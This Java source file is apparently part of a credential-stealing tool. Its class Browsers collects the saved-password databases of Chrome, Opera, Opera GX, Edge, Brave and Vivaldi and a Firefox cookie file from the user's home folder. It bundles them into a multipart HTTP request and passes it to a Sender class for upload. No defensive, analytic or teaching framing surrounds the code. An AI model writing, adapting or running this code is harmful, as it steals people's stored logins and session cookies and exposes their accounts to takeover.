package io.github.luxotick.impl;

import java.io.File;
import java.io.IOException;

import io.github.luxotick.Sender;
import okhttp3.*;

public class Browsers {
    public static void main(String[] args) throws IOException {
        String[] browserPaths = {
                "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data",
                "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data",
                "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default\\moz_cookies.sqlite",
                "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                "\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data"
        };

        String[] browserNames = {
                "Chrome",
                "Opera",
                "OperaGX",
                "Firefox",
                "MicrosoftEdge",
                "Brave",
                "Vivaldi"
        };

        OkHttpClient client = new OkHttpClient();
        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);

        for (int i = 0; i < browserPaths.length; i++) {
            String path = (System.getProperty("user.home")) + browserPaths[i];
            File browserFile = new File(path);
            if (browserFile.exists()) {
                builder.addFormDataPart("file" + (i + 1), browserFile.getName() + " " + browserNames[i],
                        RequestBody.create(MediaType.parse("application/octet-stream"), browserFile));
            } else {
                Sender.sendMessage(browserNames[i] + " not found");
            }
        }
        RequestBody requestBody = builder.build();

        Sender.Sender(client, requestBody);


    }
}
